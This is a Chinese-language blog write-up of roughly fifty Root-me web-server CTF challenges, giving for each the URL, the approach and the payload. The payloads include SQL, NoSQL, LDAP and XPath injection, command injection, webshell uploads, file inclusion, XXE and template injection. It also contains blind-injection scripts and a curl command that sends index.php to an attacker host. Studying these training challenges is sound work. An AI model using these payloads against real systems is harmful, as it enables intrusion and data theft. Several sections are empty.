---
title: Root-me Web-server write up
date: 2018-11-22 10:13:19
tags:
    - CTF
    - web安全
---

root-me是一个在线的ctf题库(需翻墙)，包含了各个维度的题型，题不算难，但是比较全面。做了一下web-server的题，并做了记录。

## 1.HTML
\[+]URL: [http://challenge01.root-me.org/web-serveur/ch1/](http://challenge01.root-me.org/web-serveur/ch1/ "http://challenge01.root-me.org/web-serveur/ch1/")
\[+]Statement:找到flag
\[+]Solution:flag在源码里,F12即可

## 2.HTTP - Open redirect
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch52/](http://challenge01.root-me.org/web-serveur/ch52/ "http://challenge01.root-me.org/web-serveur/ch52/")
\[+]Statement:找到一种方法把网页定向到其他网站
\[+]Solution:修改url里get的网站名，并计算其md5值
\[+]Payload:/web-serveur/ch52/?url=[https://www.baidu.com\&h=f9751de431104b125f48dd79cc55822a](https://www.baidu.com\&h=f9751de431104b125f48dd79cc55822a/ "https://www.baidu.com\&h=f9751de431104b125f48dd79cc55822a")

## 3.Command injection
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch54/](http://challenge01.root-me.org/web-serveur/ch54/ "http://challenge01.root-me.org/web-serveur/ch54/")
\[+]Statement:找到漏洞并利用，flag在index.php里
\[+]Solution:典型的命令注入漏洞，利用;分割命令，使用cat打印源码，再用F12查看
\[+]Payload:127.0.0.1;cat index.php

## 4.Weak password
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch3/](http://challenge01.root-me.org/web-serveur/ch3/ "http://challenge01.root-me.org/web-serveur/ch3/")
\[+]Solution:标题提示弱密码，账户admin，密码admin，登录成功

## 5.User-agent
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch2/](http://challenge01.root-me.org/web-serveur/ch2/ "http://challenge01.root-me.org/web-serveur/ch2/")
\[+]Solution:修改User-agent为admin

## 6.Backup file
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch11/](http://challenge01.root-me.org/web-serveur/ch11/ "http://challenge01.root-me.org/web-serveur/ch11/")
\[+]Solution:输入index.php\~即可下载源码

## 7.HTTP - POST
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch56/](http://challenge01.root-me.org/web-serveur/ch56/ "http://challenge01.root-me.org/web-serveur/ch56/")
\[+]Statement:想办法打败最高分
\[+]Solution:用bp修改数据包，把score参数的值修改到大于999999即可

## 8.HTTP directory indexing
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch4/](http://challenge01.root-me.org/web-serveur/ch4/ "http://challenge01.root-me.org/web-serveur/ch4/")
\[+]Solution:在源码里发现存在文件admin/pass.html,输入payload：admin可以列出目录，在backup的admin.txt到到flag

## 9.HTTP Headers
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch5/](http://challenge01.root-me.org/web-serveur/ch5/ "http://challenge01.root-me.org/web-serveur/ch5/")
\[+]Statement:获得 administrator用户权限
\[+]Solution:在服务器的返回头里发现Header-RootMe-Admin: none，于是在请求里加上Header-RootMe-Admin:administrator,得到flag

## 10.HTTP verb tampering
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch8/](http://challenge01.root-me.org/web-serveur/ch8/ "http://challenge01.root-me.org/web-serveur/ch8/")
\[+]Solution:篡改HTTP请求，换成OPTIONS即可绕过

## 11.Install files
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch6/](http://challenge01.root-me.org/web-serveur/ch6/ "http://challenge01.root-me.org/web-serveur/ch6/")
\[+]Solution:题目提示PHPBB和installfiles，查看PHPBB源码得知PHPBB的安装路径为/install/install.php。输入此路径得到flag。此漏洞提示我们安装完CMS后记得删除安装文件

## 12.Improper redirect
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch32/](http://challenge01.root-me.org/web-serveur/ch32/ "http://challenge01.root-me.org/web-serveur/ch32/")
\[+]Solution:使用BP抓包可以看到get上面的URL时返回的数据包里有flag。此漏洞提醒在使用PHP里的header(‘Location:…’)函数后需要使用exit()，不然php会继续执行后面的代码，可能会造成信息泄漏

## 13.CRLF
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch14/](http://challenge01.root-me.org/web-serveur/ch14/ "http://challenge01.root-me.org/web-serveur/ch14/")
\[+]Statement:注入错误的数据到日志中
\[+]Solution:页面显示的日志中存在认证失败和认证成功两种信息。通过使用CRLF注入，在username参数的位置注入一个%0d%0a，伪造出一个认证成功的信息
\[+]Payload:username=admin authenticated.%0D%0Aadmin\&password=123

## 14.File upload - double extensions
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch20/](http://challenge01.root-me.org/web-serveur/ch20/ "http://challenge01.root-me.org/web-serveur/ch20/")
\[+]Statement:目标是上传php代码，查看应用根目录的.passwd文件
\[+]Solution:在 /?galerie=upload处可以上传文件，直接上传php文件会被拦截。使用bp上传一句话木马，并把文件名改为1.php.jpg,测试发现web服务器可以解析该文件，通过执行系统命令可以看到.passwd的内容

## 15.File upload - MIME type
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch21/](http://challenge01.root-me.org/web-serveur/ch21/ "http://challenge01.root-me.org/web-serveur/ch21/")
\[+]Statement:同上
\[+]Solution:同上面一样上传文件，并在BP中把数据包的MIME类型修改为image/png,上传成功。

## 16.HTTP cookies
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch7/](http://challenge01.root-me.org/web-serveur/ch7/ "http://challenge01.root-me.org/web-serveur/ch7/")
\[+]Solution:在网页的源码中看见了提示SetCookie(‘ch7,’visiteur’’),结合页面的提示，在请求头中加上Cookie:ch7=admin，获得flag

## 17.Directory traversal
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch15/ch15.php](http://challenge01.root-me.org/web-serveur/ch15/ch15.php "http://challenge01.root-me.org/web-serveur/ch15/ch15.php")
\[+]Solution:目录穿越漏洞，输入payload：?galerie=/，可列出galerie目录下的文件列表，接着输入payload：?galerie=/86hwnX2r/，可以看到password.txt。访问这个文件，得到flag

## 18.File upload - null byte
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch22/](http://challenge01.root-me.org/web-serveur/ch22/ "http://challenge01.root-me.org/web-serveur/ch22/")
\[+]Solution:同样是文件上传漏洞，这里是00截断,需要把filename改成1.php%00.jpg，同时需要修改MIMIE类型。

## 19.PHP assert()
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch47/](http://challenge01.root-me.org/web-serveur/ch47/ "http://challenge01.root-me.org/web-serveur/ch47/")
\[+]Statement:Find and exploit the vulnerability to read the file .passwd.
\[+]Solution:提供错误的page参数，根据回显的assert函数的结果，可以进行拼接执行命令。
\[+]payload:?page=%27,%27..%27)%20===%20false%20and%20system(%27cat%20.passwd%27)%20and%20strpos(%27

## 20.PHP filters
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch12/](http://challenge01.root-me.org/web-serveur/ch12/ "http://challenge01.root-me.org/web-serveur/ch12/")
\[+]Statement:找到administrator用户的密码
\[+]Solution：通过报错发现使用了include函数，此处有文件包含漏洞，使用file://etc/passwd,发现不能包含远程文件。使用php协议进行本地文件包含
\[+]Payload:

-   [http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php](http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php "http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php")
-   [http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php](http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php "http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php")

## 21.PHP register globals
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch17/](http://challenge01.root-me.org/web-serveur/ch17/ "http://challenge01.root-me.org/web-serveur/ch17/") &#x20;
\[+]Statement:似乎开发者经常把备份文件留下… &#x20;
\[+]Solution:根据提示，下载到文件index.php.bak,分析源码。根据测试判断该服务器开启了register\_globals，因此存在变量覆盖漏洞。根据源码的逻辑，有两种解题思路，一种是直接覆盖session\[logged],另一种方法，覆盖password和hidden\_password，接着使用这个Cookie，就可以获得flag &#x20;
\[+]Payload:
-   \_SESSION\[logged]=1
-   password=1\&hidden\_password=1

## 22.File upload - ZIP
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch51/](http://challenge01.root-me.org/web-serveur/ch51/ "http://challenge01.root-me.org/web-serveur/ch51/") &#x20;
\[+]Statement:读index.php文件1qqq &#x20;
\[+]Solution:目标是要读到index.php的内容。网站的文件上传功能只能上传.zip文件，上传完成后，服务器会解压缩，解压缩后的文件可以访问。但问题是上传的文件只有txt/jpg可以访问。因此构造命令如下，创建一个符号链接。

> ln -s ../../../index.php index.txt 

接着使用如下命令压缩这个符号链接。 &#x20;

> zip --symlinks index.zip index.txt

上传这个zip文件，再访问index.txt,即可读到服务器上的index.php

## 23.Command injection - Filter bypass
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch53/](http://challenge01.root-me.org/web-serveur/ch53/index.php "http://challenge01.root-me.org/web-serveur/ch53/")
\[+]Statement:找到漏洞并利用，她有一些保护。flag在index.php里
\[+]Solution:同样的命令注入，发现过滤掉了一些符号，同时命令的运行结果不会返回，经过测试发现 - 没有被过滤，但 | < > ; \ \` & 等符号被过滤掉了，但是仍然可以用%0a注入新的命令，另外反弹shell不太能实现，选择使用curl上传文件的方法读文件。先在vps上监听 &#x20;

> nc -lvv 9999

接着执行payload如下，可以读到index.php &#x20;
\[+]Payload:127.0.0.1%0acurl -F ‘filename=@index.php’ HOST\_ADDRESS:9999

## 24.Local File Inclusion
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch16/](http://challenge01.root-me.org/web-serveur/ch16/ "http://challenge01.root-me.org/web-serveur/ch16/")
\[+]Statement:获得Admin的部分
\[+]Solution:该服务器是一个明显的本地文件包含，结合提示构造url读取admin下的index.php
\[+]Payload:[http://challenge01.root-me.org/web-serveur/ch16/?files=crypto\&f=../../admin/index.php](http://challenge01.root-me.org/web-serveur/ch16/?files=crypto\&f=../../admin/index.php "http://challenge01.root-me.org/web-serveur/ch16/?files=crypto\&f=../../admin/index.php")

## 25.Local File Inclusion - Double encoding
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch45/](http://challenge01.root-me.org/web-serveur/ch45/ "http://challenge01.root-me.org/web-serveur/ch45/")
\[+]Statement:在网站的源码里找到认证密码
\[+]Solution:在URL里发现是一个文件包含。直接使用php\://filter/…会发现被拦截了。根据提示，进行url编码，编码一次还是会被拦截，当编码两次时成功绕过。此处需要注意的是，使用在线的或者是python等urlencode的api时，它不会编码 . ,需要手动把.编码成%2e,才能绕过。通过查看源码，可以找到存在密码的config.inc.php
\[+]Payload:

-   php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv
-   php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf

## 26.PHP - Loose Comparison
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch55/](http://challenge01.root-me.org/web-serveur/ch55/ "http://challenge01.root-me.org/web-serveur/ch55/") &#x20;
\[+]Solution:页面可以查看源码。代码的逻辑是传入两个字母和数字组成的字符串，第一个字符串和一个随机数拼接，要求和第二个参数的md5值相等。题目使用==来判断。==在两者的类型不同时先转换类型为相同再比较，如果有数字类型的就会按数字类型转换。根据题目构造payload，即可获得flag &#x20;
\[+]Payload:s=0e242\&h=240610708\&submit=Check

## 27.PHP preg\_replace()
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch37/index.php](http://challenge01.root-me.org/web-serveur/ch37/index.php "http://challenge01.root-me.org/web-serveur/ch37/index.php") &#x20;
\[+]Statement:读flag.php &#x20; 
\[+]Solution:经过测试发现页面的三个输入点分别对应preg\_replace的三个参数，利用preg\_replace在第一个参数有/e的标示下，当满足匹配时会把第二个参数当作代码执行，因此构造payload可以读文件 &#x20;
\[+]Payload:search=/a/e\&replace=file\_get\_contents(‘flag.php’)\&content=a

## 28.PHP type juggling
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch44/](http://challenge01.root-me.org/web-serveur/ch44/ "http://challenge01.root-me.org/web-serveur/ch44/") &#x20;   
\[+]Solution:可以看到源码，页面的逻辑是需要满足\$auth\[‘data’]\[‘login’] == $USER && !strcmp($auth\[‘data’]\[‘password’]。同样是两个弱类型比较，第一个只需要满足值为0或者为true，即可绕过，strcmp需要使传入的参数为不含有字母的数组，即可绕过。 &#x20;
 
\[+]Payload:auth=%7B%22data%22%3A%7B%22login%22%3A0%2C%22password%22%3A\[122]%7D%7D
## 29.Remote File Inclusion
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch13/](http://challenge01.root-me.org/web-serveur/ch13/ "http://challenge01.root-me.org/web-serveur/ch13/") &#x20;
\[+]Statement:获取PHP源代码 &#x20;
\[+]Solution:测试发现有文件包含，且开启了allow\_url\_fopen和allow\_url\_include，即可以实现远程文件包含。由于在代码执行时，用户的参数被加上了后缀，使用php\://input或者是file://….不太好用，因此选择使用data:text/plain,\<?php … ?>进行文件包含，可以读到源码 &#x20;
\[+]Payload:?lang=data:text/plain,\<?php echo file\_get\_contents(‘index.php’); ?>
## 30.Server-side Template Injection
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch41/](http://challenge01.root-me.org/web-serveur/ch41/ "http://challenge01.root-me.org/web-serveur/ch41/") &#x20;
\[+]Statement:JAVA EE。利用漏洞获得SECRET\_FLAG.txt中的密码。 &#x20;
\[+]Solution:根据提示，得知服务器使用的中间件为JAVAEE，查询资料得知FreeMarker为java下最受欢迎的模版引擎，利用其格式在输入点输入\${3\*3}，发现被渲染成了9。利用FreeMarker的一个可以用来执行命令的类构造出如下payload，即可查看flag内容。 &#x20;
\[+]Payload:nickname=<#assign ex=”freemarker.template.utility.Execute”?new()> \${ ex(“cat SECRET\_FLAG.txt”) }
## 31.SQL injection - authentication
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch9/](http://challenge01.root-me.org/web-serveur/ch9/ "http://challenge01.root-me.org/web-serveur/ch9/") &#x20;
\[+]Statement:获取管理员的密码 &#x20;
\[+]Solution:无任何过滤的注入，通过order by参数可以控制登录的用户，审查元素获得密码 &#x20;
\[+]Payload:login=123#\&password=1’ or ‘1’=’1’ order by 1 –+
## 32.SQL injection - authentication - GBK
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch42/](http://challenge01.root-me.org/web-serveur/ch42/ "http://challenge01.root-me.org/web-serveur/ch42/") &#x20;
\[+]Statement:获取管理员的密码 &#x20;
\[+]Solution:根据题目判断是宽字节注入，所以利用%df逃逸PHP函数的转译。 &#x20;
\[+]Payload:login=%bf’ or 1=1 – -\&password=abc
## 33.SQL injection - string
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch19/](http://challenge01.root-me.org/web-serveur/ch19/ "http://challenge01.root-me.org/web-serveur/ch19/") &#x20;
\[+]Statment:获取管理员密码 &#x20;
\[+]Solution:测试网页，发现在action=recherche页面可以使用union函数注入，并且有回显。一步步构造Payload获取管理员密码 &#x20;
\[+]Payload:

> recherche=1' union select 1,name FROM sqlite_master where tpye='table'--+
recherche=1' union select 1,sql FROM sqlite_master where type='table' --+
recherche=1' union select username,password FROM users  --+


## 34.LDAP injection - authentication
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch25/](http://challenge01.root-me.org/web-serveur/ch25/ "http://challenge01.root-me.org/web-serveur/ch25/")
\[+]Statement:绕过验证
\[+]Solution:根据题目提示为LDAP注入，LDAP是一种轻量级目录协议，主要用于资源查询。输入 username=*)(%26\&password=111发现页面报错，并给出了查询的结构，根据给出查询结构，构造Payload，即可绕过
\[+]Payload:username=*)(|(userPassword= \*\&password=1)

## 35.NoSQL injection - authentication
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch38/](http://challenge01.root-me.org/web-serveur/ch38/ "http://challenge01.root-me.org/web-serveur/ch38/")
\[+]Statement:找到隐藏用户的用户名
\[+]Solution:题目提示NoSQL注入，查询资料了解mongodb的基本命令和注入方法。了解到\$ne为!=符号，构造payload可以形成重言式注入。构造Payload如下: &#x20;

> login[\$ne]=123&pass[$ne]=123

它在服务器端会被解释为{‘login’=>{‘$ne’=>’123’},’pass’=>{‘$ne’=>’123’}}，从单一目标查询变成了条件查询，形成永真式。此时页面返回You are connected as:admin。并没有给出flag。于是更改Payload如下： &#x20;

> login[\$ne]=admin&pass[$ne]=123


页面此时返回You are connected as:test。这个用户也不是隐藏用户。于是使用mongodb的正则表达式筛选非admin或者test用户。Payload如下 &#x20;

> login[\$regex]=\^[^(a|t)]&pass[$ne]=1


即可得到flag。

## 36.Path Truncation
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch35/](http://challenge01.root-me.org/web-serveur/ch35/ "http://challenge01.root-me.org/web-serveur/ch35/")
\[+]Statement:获取进入管理员空间的方法
\[+]Solution:根据提示得知是路径截断，结合PHP limit提示，查询资料得知在

> page=a/../admin.html/./././././././././././././././././././
> 
## 37.PHP Serialization
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch28/](http://challenge01.root-me.org/web-serveur/ch28/ "http://challenge01.root-me.org/web-serveur/ch28/")
\[+]Statement:获取管理员的访问权限
\[+]Solution:可以看到源码，分析源码逻辑。最终目的是要使\$_SESSION[‘login’]=admin。其中关键变量\$data有两种赋值方式，一种是通过传入的POST参数赋值，另一种是从cookie里的autologin的值反序列化得到。下面的验证逻辑是比较\$data[‘password’]\==\$auth\[\$data[‘login’]],后者的值应该为一个字符串，而这里可以里用==的弱类型比较，使$data\[‘password’]的值为true，即可绕过比较。因此构造php页面如下 &#x20;

```
<?php
$data['login']='superadmin';
$data['password']=true;
echo(urlencode(serialize($data)));
?>
```

构造Cookie如下，并且去掉POST的两个参数，即可绕过。 &#x20;
\[+]Payload:Cookie:autologin=a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D

## 38.SQL injection - numeric
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch18/](http://challenge01.root-me.org/web-serveur/ch18/ "http://challenge01.root-me.org/web-serveur/ch18/")
\[+]Statement:获取管理员的密码
\[+]Solution:当输入1‘时，发现会报错，提示存在\，判断应该是加了waf过滤。根据题目提示，为数字型注入，因此不使用单双引号进行注入。
\[+]Payload: &#x20;

```
action=news&news_id=4%20union%20select%201,name,sql%20from%20sqlite_master
action=news&news_id=4%20union%20select%201,username,password%20from%20users
```

## 39.SQL Injection - Routed
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch49/](http://challenge01.root-me.org/web-serveur/ch49/ "http://challenge01.root-me.org/web-serveur/ch49/")
\[+]Statement:找到管理员的密码
\[+]Solution:题目的意思为路由注入，也就跟二次注入差不多，查看页面逻辑，第一个页面怎么登录都显示账户或密码错误，第二个页面发现可以注入，当输入’union select 1时，页面的第二行数据显示为1，根据提示，再在联合查询后跟一个子联合查询，并且使用16进制表示以绕过waf。由于直接查询读数我这里老出语法错误，因此我使用基于报错的查询方式构造Payload，一步步读出密码
\[+]Payload:（需要16进制编码） &#x20;
```
'union select concat(0x7e,database(),0x7e),0 or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema="c_webserveur_49" ),0x7e),1)'--+
'union select concat(0x7e,database(),0x7e),0 or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name="users" ),0x7e),1)'--+
'union select concat(0x7e,database(),0x7e),0 or updatexml(1,concat(0x7e,(select concat_ws(':',login,password) from users limit 1),0x7e),1)'--+
```

## 40.PHP - Eval
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch57/](http://challenge01.root-me.org/web-serveur/ch57/ "http://challenge01.root-me.org/web-serveur/ch57/")
\[+]Statement:找到这个服务器的漏洞并利用。flag在.passwd文件中。
\[+]Solution:题目给出了源码，大致意思是需要构造一个没有字母和反斜杠的webshell，之前看[P总的文章](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html "P总的文章")里有详细介绍无字母数字的webshell构造方法，利用位运算里的取反操作符～可以把汉字里某些字符变成字母，利用这个特性，构造出Payload，可构造出webshell。
\[+]Payload: &#x20;

```
input=$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);&2=system('cat .passwd')

```

## 41.XML External Entity
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch29/](http://challenge01.root-me.org/web-serveur/ch29/ "http://challenge01.root-me.org/web-serveur/ch29/")
\[+]Statement:获取管理员的密码
\[+]Solution:题目考察XXE(外部实体注入)，打开页面是一个在线检测网页是不是合法的RSS格式的页面，可以输入文件的地址。于是在vps上创建一个xsl文件，在里面加入xxePayload，并加上合法的RSS文件格式，在W3CSchool可以找到。输入网址，可以实现文件读取。
\[+]Payload: &#x20;

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<rss version="2.0">
<channel>
  <title>&sp;</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>&sp;</title>
    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>https://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>
</rss>
```

## 42.SQL Truncation
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch36/](http://challenge01.root-me.org/web-serveur/ch36/ "http://challenge01.root-me.org/web-serveur/ch36/")
\[+]Statement:找到进入管理员空间的方法
\[+]Solution:利用sql截断的特性。在页面的源码里给出了创建表的sql语句。可以看到用户名只有12位，当我们注册如下账户admin a时，mysql会默认截断12位后的a，当服务器的配置不当时，我们此时就已经修改了admin的密码。

## 43.XPath injection - authentication
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch23/](http://challenge01.root-me.org/web-serveur/ch23/ "http://challenge01.root-me.org/web-serveur/ch23/")
\[+]Statement:找到管理员的密码
\[+]Solution:Xpath类型的认证注入，构造永真式，同时根据member页面显示的管理员的用户名，构造payload，获取管理员权限
\[+]Payload:username=John or ‘1’=’1\&password=123

## 44.Local File Inclusion - Wrappers
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch43/](http://challenge01.root-me.org/web-serveur/ch43/ "http://challenge01.root-me.org/web-serveur/ch43/")
\[+]Statement:找到flag
\[+]Solution:这是一个结合文件上传、文件包含和伪协议的题。通过使用[github上的zip文件上传payload](<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion - Path Traversal#wrapper-zip> "github上的zip文件上传payload")，绕过图片类型检测，并通过执行代码里的show\_source(‘index.php’)，查看到源码。但发现服务器禁止了外部命令执行的函数。通过列目录，发现flag文件，再用show\_source查看flag文件。
\[+]Payload: &#x20;

```
echo '<pre><?php
function get_allfiles($path,&$files)
{
    if(is_dir($path))
    {
        $dp = dir($path);
        while ($file = $dp ->read())
        {
            if($file !== "." && $file !== "..")
            {
                get_allfiles($path."/".$file, $files);
            }
        }
        $dp ->close();
    }
    if(is_file($path))
    {
        $files[] =  $path;
    }
}
function get_filenamesbydir($dir)
{
    $files =  array();
    get_allfiles($dir,$files);
    return $files;
}
$filenames = get_filenamesbydir("./");
//打印所有文件名，包括路径
foreach ($filenames as $value)
{
    echo $value, PHP_EOL;
}
?></pre>
' > a.php;
zip payload.zip a.php;
mv payload.zip payload.jpg;
http://challenge01.root-me.org/web-serveur/ch43/index.php?page=zip://tmp/upload/3rqsJvyOk.jpg%23a
```


## 45.SQL injection - Error
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch34/](http://challenge01.root-me.org/web-serveur/ch34/ "http://challenge01.root-me.org/web-serveur/ch34/")
\[+]Statement:找到管理员的密码
\[+]Solution:页面的第一个页面无法注入。但第二个页面的order参数可以注入。利用sqlmap可以注入出数据。
\[+]Payload:action=contents\&order=ASC,(SELECT (CASE WHEN (8970=8970) THEN 1 ELSE 1/(SELECT 0) END))

## 46.SQL injection - Insert

## 47.XSLT - Code execution

## 48.Java - Spring Boot

## 49.SQL injection - file reading
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch31/](http://challenge01.root-me.org/web-serveur/ch31/ "http://challenge01.root-me.org/web-serveur/ch31/")
\[+]Statement:找到管理员的密码
\[+]Solution:member页面的id参数可以注入，使用union select可以读到表里的member密码。但是并不是正确的密码。按照题目要求，需要读文件。使用load\_file()函数读取，猜测文件路径，最后确定为/challenge/web-serveur/ch31/index.php，这里因为单双引号被过滤了，所以使用16进制表示。然后可以读到index.php源码。源码里给出了从数据库里的密码到和输入比较的字符串的解密函数，在本地利用这个函数计算出真实密码值，另外注意到源码里是输入的sha1值等于这个值，所以在在线的sha1解密网站解密这个值，得到最终的密码
\[+]Payload: &#x20;

```
http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=-1 union select load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4-- +
```

## 50.XPath injection - string
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch27/](http://challenge01.root-me.org/web-serveur/ch27/ "http://challenge01.root-me.org/web-serveur/ch27/")
\[+]Statement:获取管理员密码
\[+]Solution:在member页面可以注入，并且测试发现会出现输入语句的报错，构造payload可以读到用户名和密码。一对一对测试可以找到管理员账号。
\[+]Payload: &#x20;

```
') or ('1'='1
1' or '1'='1')]|//user/password[contains(.,'
```

## 51.NoSQL injection - blind
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch48/](http://challenge01.root-me.org/web-serveur/ch48/ "http://challenge01.root-me.org/web-serveur/ch48/")
\[+]Statement:这是一个web应用，找到nosqlblind的flag
\[+]Solution:在name输入nosqlblind，利用基于布尔类型的注入，使用regex一位一位的进行注入，最终可以得到flag。
\[+]Payload: &#x20;

```
 import requests,threading,queue,time,string
SHARE_Q=queue.Queue()
payload=""
next=False
class worker(threading.Thread):
	def __init__(self,func):
		threading.Thread.__init__(self)
		self.func=func
	def run(self):
		self.func()
def scan():
	global SHARE_Q
	global payload
	global next
	if next==True:
		next=False
		return
	url="http://challenge01.root-me.org/web-serveur/ch48/index.php?chall_name=nosqlblind&flag[$regex]=^({})"
	while not SHARE_Q.empty():
		i=SHARE_Q.get(timeout=1)
		print('[url]:'+payload+i)
		r=requests.get(url.format(payload+i))
		if 'Yeah' in r.text:
			payload+=i
			print('[payload]:'+payload)
			SHARE_Q.queue.clear()
			next=True
			SHARE_Q.task_done()
			return
	SHARE_Q.task_done()
def main():
	global SHARE_Q
	threads=[]
	while True:
		for i in string.printable[:-6]:
			if i in '*.?+$^[](){}|\\/':
				SHARE_Q.put('\\'+i)
			else:
				SHARE_Q.put(i)
		for i in range(10):
			thread=worker(scan)
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()
		SHARE_Q.join()
if __name__ == '__main__':
	main()
```

## 52.SQL injection - Time based
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch40/](http://challenge01.root-me.org/web-serveur/ch40/ "http://challenge01.root-me.org/web-serveur/ch40/")
\[+]Statement:获取管理员密码
\[+]Solution:在member页面可以注入，根据提示只能时间注入，放在sqlmap里跑即可。
\[+]Payload: &#x20;

```
python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" -v3 -D public -T users --dump
```

## 53.SQL injection - blind
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch10/](http://challenge01.root-me.org/web-serveur/ch10/ "http://challenge01.root-me.org/web-serveur/ch10/")
\[+]Statement:获得管理员密码
\[+]Solution:这个页面注册时可以注入登录，因此可以利用基于boolen的注入一步步猜解出数据库信息
\[+]Payload:盲注脚本如下 &#x20;
```
import requests,string,threading,queue,time
url="http://challenge01.root-me.org/web-serveur/ch10/"
username=''
password=''
payload=''
next=False
class myThread(threading.Thread):
    """docstring for myThread"""
    def __init__(self, func,queue):
        super(myThread, self).__init__()
        self.func=func
        self.queue=queue
    def run(self):
        while True:
            data=self.queue.get()
            self.func(data)
            self.queue.task_done()
def work(data):
    i,j,k=data
    global next,payload
    #username="1' or substr((select sql FROM sqlite_master where type='table'),{},1)='{}' --+".format(j,i)
    username="1' or substr((select username||':'||password FROM  users limit {},1),{},1)='{}' --+".format(k,j,i)
    print(username)
    data={"username":username,"password":'1'}
    
    page = ''
    while page == '':
        try:
            page = requests.post(url,data=data)
            break
        except:
            print("Connection refused by the server..")
            print("Let me sleep for 5 seconds")
            print("ZZzzzz...")
            time.sleep(5)
            print("Was a nice sleep, now let me continue...")
            continue
    
    if 'Welcome' in page.text:
        payload+=i
        print(payload)
        next=True
q=queue.Queue(5)
for i in range(5):
        thread=myThread(work,q)
        thread.start()
        #threads.append(thread)
'''for j in range(1,100):
    if next==True:
        next=False
    for i in string.printable[:-5]:
        if next==False:
            q.put([i,j])
            #print("{} is put".format(j))
        else:
            next=False
            break
q.join()'''
for k in range(1,5):
    for j in range(1,100):
        if next==True:
            next=False
        for i in string.printable[:-5]:
            if next==False:
                q.put([i,j,k])
                #print("{} is put".format(j))
            else:
                next=False
                break
    q.jojn()
```

## 54.XPath injection - blind
\[+]URL:[http://challenge01.root-me.org/web-serveur/ch24/](http://challenge01.root-me.org/web-serveur/ch24/ "http://challenge01.root-me.org/web-serveur/ch24/")


